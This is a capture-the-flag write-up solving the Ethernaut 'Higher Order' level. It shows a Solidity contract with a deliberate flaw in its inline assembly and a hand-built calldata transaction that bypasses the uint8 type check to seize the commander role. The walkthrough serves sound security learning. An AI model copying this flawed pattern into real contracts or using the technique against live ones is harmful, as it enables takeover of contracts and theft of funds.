# Ethernaut - Higher Order - Solution

## Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

contract HigherOrder {
    address public commander;

    uint256 public treasury;

    function registerTreasury(uint8) public {
        assembly {
            sstore(treasury_slot, calldataload(4))
        }
    }

    function claimLeadership() public {
        if (treasury > 255) commander = msg.sender;
        else revert("Only members of the Higher Order can become Commander");
    }
}
```

## Solution

The goal of this challenge is to become the `commander` by setting `treasury` to a value greater than 255.

If we naively try to achieve this, e.g., via

```javascript
await contract.registerTreasury(256)
```

the function's parameter type validation will prevent the transaction from succeeding.

If we, however, specify the calldata manually and send it off via `sendTransaction`, we can simply change one of the higher-order zeros to 1, bypassing the function's type check:

```javascript
await sendTransaction({from: "<your player address>", to: "<your level instance address>", input: "0x211c85ab00000000000000000000000000000000000000000000000000000000000001ff"})
```

In the command above, `211c85ab` is the function selector of `registerTreasury()` and `00000000000000000000000000000000000000000000000000000000000001ff` is the 32-byte word that corresponds to the decimal number 511 when interpreted as a `uint256`.

All that is left to do is to issue 

```javascript
await contract.claimLeadership()
```

in the Ethernaut console in order to complete the level.
